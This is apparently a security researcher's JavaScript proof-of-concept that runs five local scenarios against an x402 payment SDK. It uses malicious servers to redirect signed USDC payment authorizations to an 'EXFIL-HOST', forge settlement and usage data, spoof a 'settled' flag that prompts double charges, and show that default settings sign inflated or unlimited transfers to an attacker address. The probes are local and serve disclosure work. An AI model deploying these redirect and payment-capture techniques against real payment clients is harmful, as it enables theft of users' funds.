// ============================================================================
// CRITICAL-CHAIN PROBES — @opensea/tool-sdk@0.29.0 — ALL LOCAL, throwaway keys
// No requests leave this machine (aggregator is a local server by design).
// ============================================================================
import http from 'node:http';
import { privateKeyToAccount } from 'viem/accounts';
import { recoverTypedDataAddress } from 'viem';
import { paidFetch, paidAuthenticatedFetch } from '@opensea/tool-sdk';

const VICTIM = privateKeyToAccount('0x' + '11'.repeat(32)); // throwaway
const ATTACKER = '0xdead000000000000000000000000000000000001';
const CREATOR  = '0xabcdef0123456789abcdef0123456789abcdef01'; // honest manifest recipient
const USDC_BASE = '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913';
const USDC_SEPOLIA = '0x036cbd53842c5426634e7929541ec2318f3dcf7e';
const MANIFEST_PRICE = '10000'; // $0.01 as registered in the on-chain manifest
const FAKE_TX = '0x' + 'ab'.repeat(32); // format-valid; attacker would use any real Base tx
const sleep = ms => new Promise(r => setTimeout(r, ms));

const challenge = (resource, amount, payTo = ATTACKER, asset = USDC_BASE, network = 'base') => ({
  x402Version: 1, error: 'Payment required',
  accepts: [{ scheme:'exact', network, maxAmountRequired:amount, payTo, asset, resource,
    description:'Tool invocation', mimeType:'application/json', maxTimeoutSeconds:60,
    extra:{name:'USD Coin',version:'2'} }],
});
const settlementHeader = tx => Buffer.from(JSON.stringify({success:true, transaction:tx, network:'base'})).toString('base64');
const decodeAuth = h => { try { const j = JSON.parse(Buffer.from(h,'base64').toString()); return j.payload?.authorization; } catch { return null; } };
const decodePay = h => { try { return JSON.parse(Buffer.from(h,'base64').toString()); } catch { return null; } };
const listen = srv => new Promise(r => srv.listen(0,'127.0.0.1',r)).then(()=>`http://127.0.0.1:${srv.address().port}`);
const collect = (srv, log) => { srv.on('request', undefined); return log; };

function makeServer(handler, log) {
  const srv = http.createServer((req,res)=>{
    let b=''; req.on('data',c=>b+=c); req.on('end',()=>{
      const rec = { t:Date.now(), method:req.method, url:req.url,
        paymentHeaders:Object.fromEntries(Object.entries(req.headers).filter(([k])=>/payment|signature|auth/i.test(k))),
        body:b.slice(0,2000) };
      log.push(rec); handler(req,res,rec);
    });
  });
  return srv;
}

console.log('#'.repeat(78));
console.log('# CRITICAL-CHAIN PROBES — victim key is throwaway:', VICTIM.address);
console.log('# manifest price on record: $0.01 ->', CREATOR);
console.log('#'.repeat(78));

// ---------------------------------------------------------------------------
// S1. Redirect AFTER signing: does the signed X-PAYMENT (bearer instrument)
//     get forwarded cross-origin to an arbitrary host?
// ---------------------------------------------------------------------------
{
  console.log('\n=== S1: 302 AFTER the paid request — X-PAYMENT forwarding ===');
  const logB = [], logA = [];
  let originB;
  const B = makeServer((req,res)=>{ res.writeHead(200,{'Content-Type':'application/json'}); res.end('{"served-by":"EXFIL-HOST"}'); }, logB);
  const A = makeServer((req,res)=>{
    if (Object.keys(logA[logA.length-1]?.paymentHeaders??{}).length || req.headers['x-payment']) {
      res.writeHead(302,{Location:`${originB}/exfil`}); return res.end();
    }
    res.writeHead(402,{'Content-Type':'application/json','X-Accept-Payment':'x402'});
    res.end(JSON.stringify(challenge(`${originB}/x`, '5000000000'))); // $5,000
  }, logA);
  originB = await listen(B); const originA = await listen(A);
  let out;
  try { const r = await paidFetch(`${originA}/tool`, { signer: VICTIM, method:'POST', body:'{}' }); out = `HTTP ${r.status} body=${await r.text()}`; }
  catch(e){ out = 'threw: '+e.message; }
  console.log(' caller called     :', originA + '/tool');
  console.log(' paidFetch returned:', out, ' <- caller believes the tool answered');
  for (const rec of logB) {
    const names = Object.keys(rec.paymentHeaders);
    console.log(` EXFIL-HOST received: ${rec.method} ${rec.url} payment-bearing headers: [${names.join(', ')||'none'}]`);
    for (const [k,v] of Object.entries(rec.paymentHeaders)) {
      const a = decodeAuth(v);
      if (a) console.log(`   ${k} -> EIP-3009 auth: to=${a.to} value=$${Number(a.value)/1e6} validBefore=${a.validBefore}`);
    }
  }
  A.close(); B.close();
}

// ---------------------------------------------------------------------------
// S2. Redirect BEFORE signing (probe stage): payment destination retargeted +
//     usage report to the (local) aggregator with attacker-forged txHash and
//     tool_endpoint = the ORIGINAL url (identity confusion).
// ---------------------------------------------------------------------------
{
  console.log('\n=== S2: 302 on the PROBE — retarget + forged usage report ===');
  const logB = [], logC = [], logA = [];
  let originB, originC;
  const C = makeServer((req,res)=>{ res.writeHead(200,{'Content-Type':'application/json'}); res.end('{"ok":true}'); }, logC); // local aggregator
  const B = makeServer((req,res)=>{
    if (req.headers['x-payment']) {
      res.writeHead(200,{'Content-Type':'application/json','X-PAYMENT-RESPONSE':settlementHeader(FAKE_TX)});
      return res.end('{"result":"tool output"}');
    }
    res.writeHead(402,{'Content-Type':'application/json','X-Accept-Payment':'x402'});
    res.end(JSON.stringify(challenge(`${originB}/tool`, MANIFEST_PRICE)));
  }, logB);
  const A = makeServer((req,res)=>{ res.writeHead(302,{Location:`${originB}/tool`}); res.end(); }, logA);
  originC = await listen(C); originB = await listen(B); const originA = await listen(A);
  await paidFetch(`${originA}/tool`, { signer: VICTIM, method:'POST', body:'{}',
    reportCallerUsage: { aggregatorUrl:`${originC}/api/v2/tools/usage`, apiKey:'test-key-123', timeoutMs:2000 } });
  await sleep(1200);
  const paid = logB.find(r=>r.paymentHeaders['x-payment']);
  if (paid) { const a = decodeAuth(paid.paymentHeaders['x-payment']);
    console.log(' payment actually went to :', originB, '(NOT the called origin', originA + ')');
    console.log(' signed authorization     : to=%s value=$%s', a.to, Number(a.value)/1e6); }
  for (const rec of logC) {
    console.log(' LOCAL AGGREGATOR (stands in for api.opensea.io) received:');
    console.log('   POST', rec.url, ' x-api-key:', rec.paymentHeaders['x-api-key'] ?? '(n/a — filtered)');
    try { console.log('   body:', JSON.stringify(JSON.parse(rec.body),null,2).split('\n').join('\n   ')); } catch { console.log('   body:', rec.body); }
  }
  console.log(' NOTE: tx_hash is whatever the responding server put in X-PAYMENT-RESPONSE.');
  console.log('       tool_endpoint names origin A; the money went to origin B.');
  A.close(); B.close(); C.close();
}

// ---------------------------------------------------------------------------
// S3. The `settled` flag on X402PaymentError is decided by ATTACKER-CONTROLLED
//     headers: same on-chain reality (server kept the signed auth and can
//     settle it), opposite SDK advice.
// ---------------------------------------------------------------------------
{
  console.log('\n=== S3: 502-after-signature — settled flag is header-derived ===');
  const mk = (withHeader) => { const log=[]; const s = makeServer((req,res)=>{
      if (req.headers['x-payment']) { const h={'Content-Type':'text/plain'}; if (withHeader) h['X-PAYMENT-RESPONSE']=settlementHeader(FAKE_TX);
        res.writeHead(502,h); return res.end('bad gateway'); }
      res.writeHead(402,{'Content-Type':'application/json','X-Accept-Payment':'x402'});
      res.end(JSON.stringify(challenge('http://x/t','1000000'))); // $1
    }, log); return s; };
  for (const withHeader of [false, true]) {
    const s = mk(withHeader); const o = await listen(s);
    try { await paidFetch(`${o}/t`, { signer: VICTIM, method:'POST', body:'{}' }); console.log(' no error?!'); }
    catch (e) { console.log(` server 502'd WITH settlement header = ${String(withHeader).padEnd(5)} -> ${e.name}: settled=${e.settled}`);
      console.log(`   SDK tells the caller: "${e.message.slice(0,110)}"`); }
    s.close();
  }
  console.log(' In both runs the server received a valid signed authorization and CAN settle it.');
  console.log(' The no-header run advises "likely not settled" -> honest caller retries -> double charge.');
}

// ---------------------------------------------------------------------------
// S4. paidAuthenticatedFetch: zero-value IDENTITY auth, then $5k payment,
//     then 302 -> what does the exfil host receive?
// ---------------------------------------------------------------------------
{
  console.log('\n=== S4: paidAuthenticatedFetch — identity + payment through a redirect ===');
  const logA = [], logB = []; let originB;
  const B = makeServer((req,res)=>{ res.writeHead(200,{'Content-Type':'application/json'}); res.end('{"ok":1}'); }, logB);
  const A = makeServer((req,res)=>{
    const pay = req.headers['x-payment'];
    if (!pay) { res.writeHead(402,{'Content-Type':'application/json','X-Accept-Payment':'x402'});
      return res.end(JSON.stringify(challenge(`${originB}/x`,'0',CREATOR))); } // zero-value identity challenge
    const a = decodeAuth(pay);
    if (a && a.value === '0') { res.writeHead(402,{'Content-Type':'application/json','X-Accept-Payment':'x402'});
      return res.end(JSON.stringify(challenge(`${originB}/x`,'5000000000'))); } // now demand $5,000
    res.writeHead(302,{Location:`${originB}/exfil`}); res.end(); // paid request -> exfil
  }, logA);
  originB = await listen(B); const originA = await listen(A);
  try { await paidAuthenticatedFetch(`${originA}/tool`, { account: VICTIM, method:'POST', body:'{}' }); }
  catch(e){ console.log(' threw:', e.message.slice(0,80)); }
  for (const rec of logA) { const a = decodeAuth(rec.paymentHeaders['x-payment'] ?? '');
    if (a) console.log(` TOOL HOST saw auth  : value=$${Number(a.value)/1e6} to=${a.to}`); }
  for (const rec of logB) { const names = Object.keys(rec.paymentHeaders);
    console.log(` EXFIL HOST received : ${rec.method} ${rec.url} headers=[${names.join(', ')||'none'}]`);
    const a = decodeAuth(rec.paymentHeaders['x-payment'] ?? '');
    if (a) console.log(`   -> $${Number(a.value)/1e6} authorization to ${a.to} handed to a host the caller never chose`); }
  A.close(); B.close();
}

// ---------------------------------------------------------------------------
// S5. DEFAULTS TABLE: paidFetch(url,{signer}) with NO guards, plus signature
//     recovery proving the auth is genuinely victim-signed and executable.
// ---------------------------------------------------------------------------
{
  console.log('\n=== S5: what defaults sign (manifest says $0.01 -> creator) ===');
  const cases = [
    ['honest $0.01 (matches manifest)', 'base', USDC_BASE, MANIFEST_PRICE, CREATOR],
    ['inflated $5,000',                 'base', USDC_BASE, '5000000000', ATTACKER],
    ['whole balance 2^256-1',           'base', USDC_BASE, (2n**256n-1n).toString(), ATTACKER],
    ['testnet base-sepolia',            'base-sepolia', USDC_SEPOLIA, MANIFEST_PRICE, ATTACKER],
  ];
  let lastAuth, lastSig;
  for (const [label, network, asset, amount, payTo] of cases) {
    const log=[]; let captured=null;
    const s = makeServer((req,res)=>{
      if (req.headers['x-payment']) { captured = req.headers['x-payment'];
        res.writeHead(200,{'Content-Type':'application/json'}); return res.end('{}'); }
      res.writeHead(402,{'Content-Type':'application/json','X-Accept-Payment':'x402'});
      res.end(JSON.stringify(challenge('http://127.0.0.1/t', amount, payTo, asset, network)));
    }, log);
    const o = await listen(s);
    try { await paidFetch(`${o}/t`, { signer: VICTIM, method:'POST', body:'{}' }); } catch(e){ console.log(label.padEnd(34),'BLOCKED:',e.message.slice(0,60)); s.close(); continue; }
    const a = captured ? decodeAuth(captured) : null;
    if (network==='base' && a && amount==='5000000000') { lastAuth = a; lastSig = decodePay(captured)?.payload?.signature; }
    console.log(label.padEnd(34), a ? `SIGNED value=${a.value.slice(0,16).padEnd(16)} to=${a.to===ATTACKER?'ATTACKER':a.to.slice(0,10)} chain-token=${asset.slice(0,10)}` : 'no auth');
    s.close();
  }
  if (lastAuth) {
    const recovered = await recoverTypedDataAddress({
      domain: { name:'USD Coin', version:'2', chainId:8453, verifyingContract:USDC_BASE },
      types: { TransferWithAuthorization: [
        {name:'from',type:'address'},{name:'to',type:'address'},{name:'value',type:'uint256'},
        {name:'validAfter',type:'uint256'},{name:'validBefore',type:'uint256'},{name:'nonce',type:'bytes32'}] },
      primaryType: 'TransferWithAuthorization',
      message: { from:lastAuth.from, to:lastAuth.to, value:BigInt(lastAuth.value),
        validAfter:BigInt(lastAuth.validAfter), validBefore:BigInt(lastAuth.validBefore), nonce:lastAuth.nonce },
      signature: lastSig,
    });
    console.log('\n signature recovery :', recovered, recovered.toLowerCase()===VICTIM.address.toLowerCase() ? '== VICTIM (genuine, submittable transferWithAuthorization)' : 'MISMATCH');
    const mins = Math.round((Number(lastAuth.validBefore)-Date.now()/1000)/60);
    console.log(' validity window    : ~'+mins+' minutes — bearer instrument, whoever holds it can settle');
  }
}
console.log('\nALL SCENARIOS COMPLETE — no external network calls were made.');
